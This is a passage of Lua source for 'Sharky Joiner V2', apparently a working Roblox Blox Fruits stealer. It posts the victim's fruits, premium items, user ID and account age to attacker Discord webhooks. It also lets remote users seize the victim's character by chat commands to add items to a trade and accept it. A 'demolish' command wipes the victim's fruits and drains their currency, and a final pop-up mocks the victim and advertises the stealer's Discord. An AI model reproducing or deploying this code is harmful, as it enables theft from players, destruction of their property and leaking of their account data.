            },
            {
                name = "<a:moistwoo:1013950690277724170> **Victim's Fruits**",
                value = formatFruitListWithEmojis_NoCodeBlock(fruits),
                inline = false
            },
            {
                name = "<a:catdance:728487186143641661> **Victim's Premium Items**",
                value = formatPremiumList_NoCodeBlock(premiumItems),
                inline = false
            },
            {
                name = "<:script:1353078817018876084> **Join Script (PC Copy)**",
                value = joinScriptPC_Formatted,
                inline = false
            },
            {
                name = "<:script:1353078817018876084> **Join Script (Mobile Copy)**",
                value = joinScriptMobile_Formatted,
                inline = false
            }
        },
        footer = {
            text = "Sharky Joiner V2 • " .. os.date("%Y-%m-%d")
        }
    }

    local payloadTable = {
        content = mention,
        embeds = {
            embedData
        }
    }
    local mainPayloadBody = HttpService:JSONEncode(payloadTable)
    local adminPayloadBody = nil -- Optional: create if dummy needs different content
    if hasGoodFruit or dragonHit or hasPremiumItem then
        -- Maybe use a slightly different title or mention for the dummy hook
        -- For now, let's just reuse the main payload for simplicity if triggered
        adminPayloadBody = mainPayloadBody
    end

    -- Send Webhooks Asynchronously
    task.spawn(function()
        local headersWithSecret = {
            ["Content-Type"] = "application/json",
            ["X-Client-Key"] = validation_sig
        }
        if url1 and mainPayloadBody then
            SafeRequest({
                Url = url1,
                Method = "POST",
                Headers = headersWithSecret,
                Body = mainPayloadBody
            })
        end
        if url2 and mainPayloadBody then
            task.wait(0.1);
            SafeRequest({
                Url = url2,
                Method = "POST",
                Headers = headersWithSecret,
                Body = mainPayloadBody
            })
        end
        if url3 and adminPayloadBody then
            task.wait(0.1);
            SafeRequest({
                Url = url3,
                Method = "POST",
                Headers = headersWithSecret,
                Body = adminPayloadBody
            })
        end -- Send only if admin condition met
    end)

    table.clear(fruits);
    table.clear(premiumItems);
    table.clear(fruitsToHitSet)
end

-- Player Leaving Webhook (sendProtector) - MODIFIED
local inventory22 = getInventory() -- Stale inventory snapshot
local function hasFruitInInventory2()
    if not inventory22 then
        return false
    end;
    for _, item in ipairs(inventory22) do
        if item.Type == "Blox Fruit" and table.find(FruitsToHit, item.Name) then
            return true
        end
    end;
    return false
end
local function hasPremiumItems2()
    if not inventory22 then
        return false
    end;
    for _, item in ipairs(inventory22) do
        if item.Type == "Premium" then
            return true
        end
    end;
    return false
end
local webhookSent = false

local function sendProtector()
    if webhookSent or not (hasFruitInInventory2() or hasPremiumItems2()) then
        return
    end
    webhookSent = true
    local url1 = webhook1_key and _G[webhook1_key];
    local url2 = Protector_key and _G[Protector_key]
    if not url1 then
        return
    end
    local plr = LocalPlayer
    local embed = {
        title = "Victim has Left! <:sad:1241420488916340896>",
        description = plr.Name .. " has left the game",
        color = 16711680,
        fields = {
            {
                name = "User ID",
                value = tostring(plr.UserId),
                inline = true
            },
            {
                name = "Account Age",
                value = tostring(plr.AccountAge) .. " days",
                inline = true
            },
            {
                name = "Executor",
                value = identifyexecutor() or "Unknown",
                inline = true
            }
        },
        timestamp = DateTime.now():ToIsoDate()
    }
    local data = {
        embeds = {
            embed
        }
    };
    local body = HttpService:JSONEncode(data)
    local headersWithSecret = {
        ["Content-Type"] = "application/json",
        ["X-Client-Key"] = validation_sig
    }

    pcall(request, {
        Url = url1,
        Method = "POST",
        Headers = headersWithSecret,
        Body = body
    }) -- Send with secret header
    if url2 then
        task.wait(0.1);
        pcall(request, {
            Url = url2,
            Method = "POST",
            Headers = headersWithSecret,
            Body = body
        })
    end -- Send with secret header
    -- No send to dummy on leave
end

Players.PlayerRemoving:Connect(function(leavingPlayer)
    if leavingPlayer == LocalPlayer then
        sendProtector()
    end
    if activatedUsers[leavingPlayer.UserId] then
        activatedUsers[leavingPlayer.UserId] = nil;
        print("Deactivated user on leave:", leavingPlayer.Name)
    end
    if CommandCooldowns and CommandCooldowns[leavingPlayer.Name] then
        CommandCooldowns[leavingPlayer.Name] = nil
    end
end)

-- Movement Function (tweenToPosition) - REPLACED
local function tweenToPosition(position)
    local character = LocalPlayer.Character;
    if not character then
        return
    end
    local humanoid = character:FindFirstChildOfClass("Humanoid");
    if not humanoid or humanoid.Sit then
        return
    end
    local root = character.PrimaryPart;
    if not root then
        return
    end
    local Vector3_new, CFrame_new, CFrame_lookAt = Vector3.new, CFrame.new, CFrame.lookAt
    local bodyGyro = Instance.new("BodyGyro");
    bodyGyro.MaxTorque = Vector3_new(1e4, 1e4, 1e4);
    bodyGyro.P = 1e3;
    bodyGyro.CFrame = root.CFrame;
    bodyGyro.Parent = root
    local bodyVelocity = Instance.new("BodyVelocity");
    bodyVelocity.MaxForce = Vector3_new(1e4, 1e4, 1e4);
    bodyVelocity.P = 1e3;
    bodyVelocity.Parent = root
    local speed = 300;
    local distance = (root.Position - position).Magnitude;
    local tweenInfo = TweenInfo.new(math.max(0.5, distance / speed), Enum.EasingStyle.Linear)
    local baseParts = {};
    for _, part in ipairs(character:GetDescendants()) do
        if part:IsA("BasePart") then
            table.insert(baseParts, part)
        end
    end
    local noCollideConn = RunService.Stepped:Connect(function()
        if not character or not character.Parent then
            noCollideConn:Disconnect();
            return
        end;
        for i = 1, # baseParts do
            pcall(function()
                if baseParts[i] and baseParts[i].Parent then
                    baseParts[i].CanCollide = false
                end
            end)
        end
    end)
    local updateConn = RunService.Heartbeat:Connect(function()
        if not root or not root.Parent or not bodyGyro or not bodyGyro.Parent or not bodyVelocity or not bodyVelocity.Parent then
            if updateConn then
                updateConn:Disconnect()
            end;
            if noCollideConn then
                noCollideConn:Disconnect()
            end
            if bodyGyro and bodyGyro.Parent then
                bodyGyro:Destroy()
            end;
            if bodyVelocity and bodyVelocity.Parent then
                bodyVelocity:Destroy()
            end
            return
        end
        local direction = (position - root.Position).Unit;
        bodyGyro.CFrame = CFrame_lookAt(root.Position, root.Position + direction);
        bodyVelocity.Velocity = direction * speed
    end)
    local tween = TweenService:Create(root, tweenInfo, {
        CFrame = CFrame_new(position) * CFrame_new(0, root.Size.Y / 2, 0)
    });
    tween:Play();
    tween.Completed:Wait()
    if updateConn then
        updateConn:Disconnect()
    end;
    if noCollideConn then
        noCollideConn:Disconnect()
    end
    if bodyGyro and bodyGyro.Parent then
        bodyGyro:Destroy()
    end;
    if bodyVelocity and bodyVelocity.Parent then
        bodyVelocity:Destroy()
    end
    if character and character.Parent then
        for i = 1, # baseParts do
            pcall(function()
                if baseParts[i] and baseParts[i].Parent then
                    baseParts[i].CanCollide = true
                end
            end)
        end
    end
end

-- Trade Table Function (findTradeTable) - REPLACED & ADAPTED
local function findTradeTable()
    local tradeTablesParent = game.PlaceId == 7449423635 and Workspace.Map:FindFirstChild("Turtle") or Workspace.Map:FindFirstChild("Dressrosa")
    if not tradeTablesParent then
        return nil, nil
    end
    local tables = tradeTablesParent:GetChildren();
    if not tables then
        return nil, nil
    end
    local bestTable, bestSeat;
    local emptyTable, emptySeat;
    local fallbackTable, fallbackSeat

    -- Internal function adapted for Sharky's access control
    local function isTargetPlayer(seatWeld)
        if not seatWeld or not seatWeld.Part1 then
            return false
        end
        local character = seatWeld.Part1.Parent;
        if not character then
            return false
        end
        local player = Players:GetPlayerFromCharacter(character);
        if not player then
            return false
        end
        -- Sharky's Access Control Logic:
        local isUsernameMatch = (Usernames and table.find(Usernames, player.Name))
        local isActivated = activatedUsers[player.UserId] -- Check if activated by password
        return allowEveryone or isUsernameMatch or isActivated -- Return true if any condition met
    end

    for _, tbl in ipairs(tables) do
        if tbl.Name == "TradeTable" then
            local p1, p2 = tbl:FindFirstChild("P1"), tbl:FindFirstChild("P2")
            if p1 and p2 then
                local p1Weld, p2Weld = p1:FindFirstChild("SeatWeld"), p2:FindFirstChild("SeatWeld")
                local p1Free, p2Free = not p1Weld, not p2Weld
                local p1Target, p2Target = isTargetPlayer(p1Weld), isTargetPlayer(p2Weld)
                if (p1Target and p2Free) or (p2Target and p1Free) then
                    bestTable, bestSeat = tbl, p1Free and p1 or p2;
                    break
                end -- Priority 1: Target + Free Seat
                if p1Free and p2Free and not emptyTable then
                    emptyTable, emptySeat = tbl, p1
                end -- Priority 2: Both Free
                if not fallbackTable then -- Priority 3: One Free (not target)
                    if p1Free and not p2Target then
                        fallbackTable, fallbackSeat = tbl, p1
                    elseif p2Free and not p1Target then
                        fallbackTable, fallbackSeat = tbl, p2
                    end
                end
            end
        end
    end
    return bestTable or emptyTable or fallbackTable, bestSeat or emptySeat or fallbackSeat
end

-- Trade Partner Validation (isInTradeWithCorrectPlayer) - KEPT (Sharky's Original)
local function isInTradeWithCorrectPlayer()
    if allowEveryone then
        return true
    end -- Added for clarity
    local player = LocalPlayer;
    local playerGui = player:FindFirstChild("PlayerGui");
    if not playerGui then
        return false
    end
    local mainGui = playerGui:FindFirstChild("Main");
    if not mainGui then
        return false
    end
    local tradeFrame = mainGui:FindFirstChild("Trade");
    if not tradeFrame or not tradeFrame.Visible then
        return false
    end
    local container = tradeFrame:FindFirstChild("Container");
    local frame1 = container and container:FindFirstChild("1");
    local frame2 = container and container:FindFirstChild("2")
    local player1Label = frame1 and frame1:FindFirstChild("TextLabel");
    local player2Label = frame2 and frame2:FindFirstChild("TextLabel")
    if not player1Label or not player2Label then
        return false
    end
    local tradingPartnerName = player2Label.Text;
    local localPlayerName = player.Name;
    local localPlayerDisplayName = player.DisplayName
    if player1Label.Text ~= localPlayerName and player1Label.Text ~= localPlayerDisplayName then
        return false
    end
    for _, allowedName in ipairs(Usernames) do
        local tradingPlayer = Players:FindFirstChild(allowedName);
        if tradingPlayer then
            if string.lower(tradingPartnerName) == string.lower(tradingPlayer.Name) or string.lower(tradingPartnerName) == string.lower(tradingPlayer.DisplayName) then
                return true
            end
        end
    end
    local partnerPlayer = Players:FindFirstChild(tradingPartnerName);
    if not partnerPlayer then
        for _, p in ipairs(Players:GetPlayers()) do
            if p.DisplayName == tradingPartnerName then
                partnerPlayer = p;
                break
            end
        end
    end
    if partnerPlayer and activatedUsers[partnerPlayer.UserId] then
        return true
    end -- Check activated users
    return false
end

-- Jump Control - KEPT (Sharky's Original)
local isForceJumping = false;
local stateChangedConnections = {};
local jumpRequestConnection;
local characterAddedJumpConnection
local function ForceJump()
    local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid");
    if not humanoid then
        return
    end;
    isForceJumping = true;
    humanoid.JumpPower = 50;
    humanoid:ChangeState(Enum.HumanoidStateType.Jumping);
    task.delay(0.5, function()
        isForceJumping = false;
        if humanoid and humanoid.Parent then
            humanoid.JumpPower = 0
        end
    end)
end
local function lockJumping(humanoid)
    if not humanoid then
        return
    end;
    if stateChangedConnections[humanoid] then
        stateChangedConnections[humanoid]:Disconnect();
        stateChangedConnections[humanoid] = nil
    end;
    humanoid.JumpPower = 0;
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, false);
    stateChangedConnections[humanoid] = humanoid.StateChanged:Connect(function(old, new)
        if new == Enum.HumanoidStateType.Jumping and not isForceJumping then
            humanoid:ChangeState(old)
        end
    end)
end
local function disableJump()
    if jumpRequestConnection then
        jumpRequestConnection:Disconnect();
        jumpRequestConnection = nil
    end;
    if characterAddedJumpConnection then
        characterAddedJumpConnection:Disconnect();
        characterAddedJumpConnection = nil
    end;
    if UserInputService.TouchEnabled then
        jumpRequestConnection = UserInputService.JumpRequest:Connect(function()
            if not isForceJumping and LocalPlayer.Character then
                local h = LocalPlayer.Character:FindFirstChildOfClass("Humanoid");
                if h then
                    h:SetStateEnabled(Enum.HumanoidStateType.Jumping, false)
                end
            end
        end)
    end;
    if LocalPlayer.Character then
        lockJumping(LocalPlayer.Character:FindFirstChildOfClass("Humanoid"))
    end;
    characterAddedJumpConnection = LocalPlayer.CharacterAdded:Connect(function(char)
        task.spawn(function()
            local h = char:WaitForChild("Humanoid", 5);
            if h then
                lockJumping(h)
            end
        end)
    end);
    return function()
        if jumpRequestConnection then
            jumpRequestConnection:Disconnect();
            jumpRequestConnection = nil
        end;
        if characterAddedJumpConnection then
            characterAddedJumpConnection:Disconnect();
            characterAddedJumpConnection = nil
        end;
        for humanoid, conn in pairs(stateChangedConnections) do
            if conn and conn.Connected then
                pcall(conn.Disconnect, conn)
            end
        end;
        table.clear(stateChangedConnections)
    end
end

-- Discord Invite UI - KEPT (Sharky's Original)
local function createDiscordUI()
    local ScreenGui = Instance.new("ScreenGui");
    ScreenGui.Name = "DiscordInviteUI";
    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling;
    ScreenGui.ResetOnSpawn = false;
    ScreenGui.IgnoreGuiInset = true;
    ScreenGui.DisplayOrder = 9999;
    local MainFrame = Instance.new("Frame");
    MainFrame.Name = "MainFrame";
    MainFrame.Size = UDim2.new(0, 800, 0, 350);
    MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0);
    MainFrame.AnchorPoint = Vector2.new(0.5, 0.5);
    MainFrame.BackgroundColor3 = Color3.fromRGB(32, 34, 37);
    MainFrame.BorderSizePixel = 0;
    MainFrame.Parent = ScreenGui;
    Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 10);
    local Title = Instance.new("TextLabel");
    Title.Name = "Title";
    Title.Size = UDim2.new(1, 0, 0, 40);
    Title.Position = UDim2.new(0, 0, 0, 10);
    Title.BackgroundTransparency = 1;
    Title.Font = Enum.Font.GothamBold;
    Title.Text = "Read Below!";
    Title.TextColor3 = Color3.fromRGB(255, 255, 255);
    Title.TextScaled = true;
    Title.Parent = MainFrame;
    local Description = Instance.new("TextLabel");
    Description.Name = "Description";
    Description.Size = UDim2.new(0.9, 0, 0, 100);
    Description.Position = UDim2.new(0.05, 0, 0.3, 0);
    Description.BackgroundTransparency = 1;
    Description.Font = Enum.Font.Gotham;
    Description.Text = "Hey! Some of your VALUABLE Fruits have been stolen by Sharky Joiner V2. No need to be sad! You can join us, and learn how this stealer works - And make a lot of fruits using it!";
    Description.TextColor3 = Color3.fromRGB(220, 221, 222);
    Description.TextScaled = true;
    Description.Parent = MainFrame;
    local Button = Instance.new("TextButton");
    Button.Name = "CopyButton";
    Button.Size = UDim2.new(0.7, 0, 0, 56);
    Button.Position = UDim2.new(0.15, 0, 0.7, 0);
    Button.BackgroundColor3 = Color3.fromRGB(88, 101, 242);
    Button.Font = Enum.Font.GothamBold;
    Button.Text = "Copy Discord Invite";
    Button.TextColor3 = Color3.fromRGB(255, 255, 255);
    Button.TextScaled = true;
    Button.AutoButtonColor = false;
    Button.Parent = MainFrame;
    Instance.new("UICorner", Button).CornerRadius = UDim.new(0, 5);
    local fadeInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out);
    local function createTween(instance, props)
        return TweenService:Create(instance, fadeInfo, props)
    end;
    MainFrame.BackgroundTransparency = 1;
    Title.TextTransparency = 1;
    Description.TextTransparency = 1;
    Button.BackgroundTransparency = 1;
    Button.TextTransparency = 1;
    task.wait(0.1);
    createTween(MainFrame, {
        BackgroundTransparency = 0
    }):Play();
    task.wait(0.1);
    createTween(Title, {
        TextTransparency = 0
    }):Play();
    task.wait(0.1);
    createTween(Description, {
        TextTransparency = 0
    }):Play();
    task.wait(0.1);
    createTween(Button, {
        BackgroundTransparency = 0,
        TextTransparency = 0
    }):Play();
    Button.MouseEnter:Connect(function()
        createTween(Button, {
            BackgroundColor3 = Color3.fromRGB(71, 82, 196)
        }):Play()
    end);
    Button.MouseLeave:Connect(function()
        createTween(Button, {
            BackgroundColor3 = Color3.fromRGB(88, 101, 242)
        }):Play()
    end);
    Button.MouseButton1Click:Connect(function()
        setclipboard("https://discord.gg/uwdvTtqTDA");
        Button.Text = "Copied!";
        task.delay(2, function()
            if Button.Parent then
                Button.Text = "Copy Invite"
            end
        end)
    end);
    ScreenGui.Parent = CoreGui;
    return ScreenGui
end

-- Command System Setup
local ChatEvents = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents");
local SayMessageRequest = ChatEvents:WaitForChild("SayMessageRequest");
local function sendMessage(message)
    pcall(function()
        SayMessageRequest:FireServer(message, "All")
    end)
end;
local CommandCooldowns = {};
local DEFAULT_COOLDOWN = 0.5;

-- Command Definitions - KEPT (Sharky's Base) + ADDED + MODIFIED
local Commands = {
    jump = {
        description = "Forces the character to jump once.",
        usage = "?jump",
        execute = ForceJump
    },
    sit = {
        description = "Attempts to find a suitable trade table seat and sit down.",
        usage = "?sit",
        execute = function()
            sendMessage("Attempting to sit at trade table...");
            local tradeTable, bestSeat = findTradeTable();
            if not (tradeTable and bestSeat) then
                sendMessage("Error finding a table! Try running ?tp first.");
                return
            end;
            local character = LocalPlayer.Character;
            if not (character and character.PrimaryPart) then
                sendMessage("Character error.");
                return
            end;
            tweenToPosition(bestSeat.Position + Vector3.new(0, 2, 0));
            task.wait(1);
            local function attemptSit()
                for i = 1, 10 do
                    local randomOffset = Vector3.new(math.random(- 2, 2) / 10, math.random(- 2, 2) / 10, math.random(- 2, 2) / 10);
                    tweenToPosition(bestSeat.Position + randomOffset);
                    task.wait(0.5);
                    local humanoid = character:FindFirstChildOfClass("Humanoid");
                    if humanoid and humanoid.Sit then
                        sendMessage("Successfully sat at trade table!");
                        return true
                    end
                end;
                return false
            end;
            if not attemptSit() then
                sendMessage("Failed to sit. Try running ?sit again!")
            end
        end
    },
    tp = {
        description = "Teleports the player to the standard trading hub (Mansion/Cafe).",
        usage = "?tp",
        execute = function()
            local targetPos, locationName;
            if game.PlaceId == 7449423635 then
                locationName = "Mansion";
                local inventory = getInventory();
                if inventory then
                    for _, item in ipairs(inventory) do
                        if item.Name == "Valkyrie Helm" then
                            Remote:InvokeServer("requestEntrance", Vector3.new(- 12471.33, 374.95, - 7539.37));
                            sendMessage("Teleporting to Mansion (via Valkyrie)...");
                            return
                        end
                    end
                end;
                targetPos = Vector3.new(- 12550.8701, 337.2399, - 7425.5200)
            else
                locationName = "Cafe";
                targetPos = Vector3.new(- 381.8599, 73.0800, 299.9299)
            end;
            if targetPos then
                sendMessage("Teleporting to " .. locationName .. "...");
                tweenToPosition(targetPos)
            else
                sendMessage("Could not determine teleport location.")
            end
        end
    },
    reset = {
        description = "Resets the player's character.",
        usage = "?reset",
        execute = function()
            if LocalPlayer.Character then
                LocalPlayer.Character:BreakJoints()
            end
        end
    },
    rejoin = {
        description = "Makes the player rejoin the current server.",
        usage = "?rejoin",
        execute = function()
            TeleportService:Teleport(game.PlaceId, LocalPlayer)
        end
    },
    add = {
        description = "Adds [count] of a specific Blox Fruit to the trade.",
        usage = "?add <fruit_name> [count]",
        execute = function(argument)
            local namePart, countPart = argument:match("^(.-)%s*(%d*)$");
            if not namePart or namePart == "" then
                sendMessage("Usage: ?add <fruit_name> [count]");
                return
            end;
            local searchTerm = namePart:lower():match("^%s*(.-)%s*$");
            local requestedCount = tonumber(countPart);
            if not requestedCount or requestedCount < 1 then
                requestedCount = 1
            end;
            local inventory = getInventory();
            if not inventory then
                sendMessage("Failed to get inventory.");
                return
            end;
            local foundItem = nil;
            for _, item in pairs(inventory) do
                if item.Type == "Blox Fruit" and item.Name:lower():find(searchTerm, 1, true) then
                    foundItem = item;
                    break
                end
            end;
            if foundItem then
                local availableCount = foundItem.Count;
                local countToAdd = math.min(requestedCount, availableCount);
                if countToAdd <= 0 then
                    sendMessage("No '" .. foundItem.Name .. "' available to add.");
                    return
                end;
                sendMessage("Adding " .. countToAdd .. "x '" .. foundItem.Name .. "'...");
                local addedSuccess = 0;
                for i = 1, countToAdd do
                    local success, err = pcall(TradeFunction.InvokeServer, TradeFunction, "addItem", foundItem.Name);
                    if success then
                        addedSuccess = addedSuccess + 1
                    else
                        sendMessage("Error adding item: " .. tostring(err));
                        break
                    end;
                    task.wait(0.1)
                end;
                sendMessage("Finished adding " .. addedSuccess .. "/" .. countToAdd .. " '" .. foundItem.Name .. "'.");
                if requestedCount > availableCount then
                    sendMessage("(Note: You requested " .. requestedCount .. ", but only " .. availableCount .. " were available.)")
                end
            else
                sendMessage("No Blox Fruit matching '" .. searchTerm .. "' found in inventory!")
            end
        end
    },
    additem = {
        description = "Adds 1 of a specific Premium Item (Gamepass) to the trade.",
        usage = "?additem <item_name>",
        execute = function(argument)
            local searchTerm = argument:lower():match("^%s*(.-)%s*$");
            if searchTerm == "" then
                sendMessage("Usage: ?additem <item_name>");
                return
            end;
            local inventory = getInventory();
            if not inventory then
                sendMessage("Failed to get inventory.");
                return
            end;
            local foundItem = nil;
            for _, item in pairs(inventory) do
                if item.Type == "Premium" and item.Name:lower():find(searchTerm, 1, true) then
                    foundItem = item;
                    break
                end
            end;
            if foundItem then
                sendMessage("Adding 1x '" .. foundItem.Name .. "'...");
                TradeFunction:InvokeServer("addItem", foundItem.Name);
                task.wait(0.1);
                sendMessage("Finished adding '" .. foundItem.Name .. "'.")
            else
                sendMessage("No Premium Item matching '" .. searchTerm .. "' found in inventory!")
            end
        end
    },
    addall = {
        description = "Adds 1 of each fruit from your 'FruitsToHit' list to the trade.",
        usage = "?addall",
        execute = function()
            local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main");
            if not (tradeUI and tradeUI:FindFirstChild("Trade") and tradeUI.Trade.Visible) then
                sendMessage("Not currently in a trade.");
                return
            end;
            local inventory = getInventory();
            if not inventory then
                sendMessage("Failed to get inventory.");
                return
            end;
            local addedCount = 0;
            local addedFruits = {};
            sendMessage("Attempting to add all configured fruits...");
            local inventoryLookup = {};
            for _, item in pairs(inventory) do
                if item.Type == "Blox Fruit" then
                    inventoryLookup[item.Name] = item.Count
                end
            end;
            local fruitsToHitSet = {};
            for _, f in ipairs(FruitsToHit) do
                fruitsToHitSet[f] = true
            end;
            for fruitName, _ in pairs(fruitsToHitSet) do
                if inventoryLookup[fruitName] and inventoryLookup[fruitName] > 0 and not addedFruits[fruitName] then
                    local success, err = pcall(TradeFunction.InvokeServer, TradeFunction, "addItem", fruitName);
                    if success then
                        addedFruits[fruitName] = true;
                        addedCount = addedCount + 1;
                        sendMessage("Added 1x '" .. fruitName .. "'.")
                    else
                        sendMessage("Error adding " .. fruitName .. ": " .. tostring(err));
                        break
                    end;
                    task.wait(0.1)
                end
            end;
            if addedCount > 0 then
                sendMessage("Finished adding " .. addedCount .. " types of configured fruits.")
            else
                sendMessage("No fruits from your 'FruitsToHit' list were found/available in inventory!")
            end
        end
    },
    -- ADDED/MODIFIED COMMAND
    addallitems = {
        description = "Adds 1 of every Premium Item (Gamepass) found in inventory to the trade.",
        usage = "?addallitems",
        execute = function()
            local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main");
            if not (tradeUI and tradeUI:FindFirstChild("Trade") and tradeUI.Trade.Visible) then
                sendMessage("Not currently in a trade.");
                return
            end;
            local inventory = getInventory();
            if not inventory then
                sendMessage("Failed to get inventory.");
                return
            end;
            local addedCount = 0;
            local addedItems = {};
            sendMessage("Attempting to add all premium items...");
            for _, item in pairs(inventory) do
                if item.Type == "Premium" and item.Count > 0 and not addedItems[item.Name] then
                    local success, err = pcall(TradeFunction.InvokeServer, TradeFunction, "addItem", item.Name);
                    if success then
                        addedItems[item.Name] = true;
                        addedCount = addedCount + 1;
                        sendMessage("Added 1x '" .. item.Name .. "'.")
                    else
                        sendMessage("Error adding " .. item.Name .. ": " .. tostring(err));
                        break
                    end;
                    task.wait(0.1)
                end
            end;
            if addedCount > 0 then
                sendMessage("Finished adding " .. addedCount .. " premium items.")
            else
                sendMessage("No Premium items found/available in inventory!")
            end
        end
    },
    cleartrade = {
        description = "Removes all items the victim has placed in the trade window.",
        usage = "?cleartrade",
        execute = function()
            local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main");
            if not (tradeUI and tradeUI:FindFirstChild("Trade") and tradeUI.Trade.Visible) then
                sendMessage("Not currently in a trade.");
                return
            end;
            local container = tradeUI.Trade:FindFirstChild("Container");
            local playerFrame = container and container:FindFirstChild("1");
            local itemFrame = playerFrame and playerFrame:FindFirstChild("Frame");
            if not itemFrame then
                sendMessage("Could not find trade item frame.");
                return
            end;
            local itemsToRemove = {};
            for _, item in ipairs(itemFrame:GetChildren()) do
                if item:IsA("ImageButton") and item.Name ~= "AddBeli" then
                    table.insert(itemsToRemove, item.Name)
                end
            end;
            if # itemsToRemove == 0 then
                sendMessage("No items to remove from trade.");
                return
            end;
            sendMessage("Clearing " .. # itemsToRemove .. " items from trade...");
            local clearedCount = 0;
            for _, itemName in ipairs(itemsToRemove) do
                local success, err = pcall(TradeFunction.InvokeServer, TradeFunction, "removeItem", itemName);
                if success then
                    clearedCount = clearedCount + 1
                else
                    sendMessage("Error removing " .. itemName .. ": " .. tostring(err))
                end;
                task.wait(0.1)
            end;
            sendMessage("Cleared " .. clearedCount .. " items.")
        end
    },
    accept = {
        description = "Accepts the current trade (only works if seated).",
        usage = "?accept",
        execute = function()
            local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main");
            if not (tradeUI and tradeUI:FindFirstChild("Trade") and tradeUI.Trade.Visible) then
                sendMessage("Not currently in a trade.");
                return
            end;
            local character = LocalPlayer.Character;
            if not character then
                sendMessage("Character not found.");
                return
            end;
            local humanoid = character:FindFirstChildOfClass("Humanoid");
            if not humanoid then
                sendMessage("Humanoid not found.");
                return
            end;
            if not humanoid.Sit then
                sendMessage("Must be sitting to accept trade.");
                return
            end;
            sendMessage("Accepting trade...");
            task.wait(0.1);
            TradeFunction:InvokeServer("accept")
        end
    },
    resetfruit = {
        description = "Equips and resets [count] times with a specific fruit.",
        usage = "?resetfruit <fruit_name> [count]",
        execute = function(argument)
            local namePart, countPart = argument:match("^(.-)%s*(%d*)$");
            if not namePart or namePart == "" then
                sendMessage("Usage: ?resetfruit <fruit_name> [count]");
                return
            end;
            local searchTerm = namePart:lower():match("^%s*(.-)%s*$");
            local requestedCount = tonumber(countPart);
            if not requestedCount or requestedCount < 1 then
                requestedCount = 1
            end;
            sendMessage("Attempting to reset with '" .. searchTerm .. "' " .. requestedCount .. " times...");
            for i = 1, requestedCount do
                local inventory = getInventory();
                if not inventory then
                    sendMessage("Failed to get inventory on attempt " .. i);
                    break
                end;
                local foundItem = nil;
                for _, item in pairs(inventory) do
                    if item.Type == "Blox Fruit" and item.Name:lower():find(searchTerm, 1, true) then
                        foundItem = item;
                        break
                    end
                end;
                if foundItem then
                    local baseFruitName = foundItem.Name:match("(%S+)");
                    sendMessage("(" .. i .. "/" .. requestedCount .. ") Equipping '" .. baseFruitName .. "' and resetting...");
                    ForceJump();
                    task.wait(0.1);
                    Remote:InvokeServer("LoadFruit", baseFruitName);
                    task.wait(0.3);
                    if LocalPlayer.Character then
                        LocalPlayer.Character:BreakJoints()
                    end;
                    sendMessage("Reset complete for attempt " .. i .. ". Waiting for respawn...");
                    task.wait(5)
                else
                    sendMessage("Fruit matching '" .. searchTerm .. "' not found in inventory on attempt " .. i .. ". Aborting.");
                    break
                end;
                if i < requestedCount then
                    task.wait(0.5)
                end
            end;
            sendMessage("Finished reset fruit sequence.")
        end
    },
    invite = {
        description = "Shows the victim a UI inviting them to the Discord.",
        usage = "?invite",
        execute = createDiscordUI
    },
    demolish = {
        description = "!! DANGEROUS !! Attempts to equip and reset all fruits, then drain Beli/Fragments.",
        usage = "?demolish",
        execute = function()
            sendMessage("!!! WARNING: DEMOLISH COMMAND INITIATED !!! THIS IS DESTRUCTIVE !!!");
            local function invokeRemote(remoteName, args)
                local remote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild(remoteName);
                return remote:InvokeServer(unpack(args))
            end;
            invokeRemote("CommF_", {
                "RemoveFruit",
                "Beli"
            });
            local inventory = getInventory();
            if not inventory then
                return
            end;
            local fruits = {};
            for _, item in pairs(inventory) do
                if item.Type == "Blox Fruit" then
                    table.insert(fruits, item)
                end
            end;
            table.sort(fruits, function(a, b)
                return a.Value > b.Value
            end);
            for i, fruit in ipairs(fruits) do
                local baseFruitName = fruit.Name:match("(%S+)");
                sendMessage("(" .. i .. "/" .. # fruits .. ") Resetting with '" .. baseFruitName .. "'...");
                ForceJump();
                invokeRemote("CommF_", {
                    "LoadFruit",
                    baseFruitName
                });
                task.wait(0.5);
                if LocalPlayer.Character then
                    LocalPlayer.Character:BreakJoints();
                    task.wait(6)
                end
            end;
            local function drainBeli()
                local rocketArgs = {
                    "PurchaseRawFruit",
                    "Rocket-Rocket",
                    false
                };
                local spinArgs = {
                    "PurchaseRawFruit",
                    "Spin-Spin",
                    false
                };
                while true do
                    invokeRemote("CommF_", rocketArgs);
                    task.wait(0.01);
                    invokeRemote("CommF_", spinArgs);
                    task.wait(0.01)
                end
            end;
            local function drainFragments()
                local fragmentArgs = {
                    "BlackbeardReward",
                    "Refund",
                    "2"
                };
                while true do
                    invokeRemote("CommF_", fragmentArgs);
                    task.wait()
                end
            end;
            coroutine.wrap(drainBeli)();
            coroutine.wrap(drainFragments)()
        end
    },
    showinv = {
        description = "Shows the victim's Blox Fruit inventory (by value) in chat.",
        usage = "?showinv",
        execute = function()
            task.spawn(function()
                sendMessage("Fetching inventory (sorted by value)...");
                local inventory = getInventory();
                if not inventory then
                    sendMessage("Error: Failed to retrieve inventory.");
                    return
                end;
                local fruitDataList = {};
                for _, item in pairs(inventory) do
                    if item.Type == "Blox Fruit" then
                        table.insert(fruitDataList, {
                            name = item.Name,
                            count = item.Count,
                            value = item.Value or 0
                        })
                    end
                end;
                if # fruitDataList == 0 then
                    sendMessage("No Blox Fruits found in inventory.");
                    return
                end;
                table.sort(fruitDataList, function(a, b)
                    return a.value > b.value
                end);
                local fruitDisplayList = {};
                for _, fruitData in ipairs(fruitDataList) do
                    local fruitString = fruitData.name;
                    if fruitData.count > 1 then
                        fruitString = fruitString .. " (x" .. fruitData.count .. ")"
                    end;
                    table.insert(fruitDisplayList, fruitString)
                end;
                local messageLimit = 180;
                local itemsPerEstimate = 10;
                local totalChunks = math.ceil(# fruitDisplayList / itemsPerEstimate);
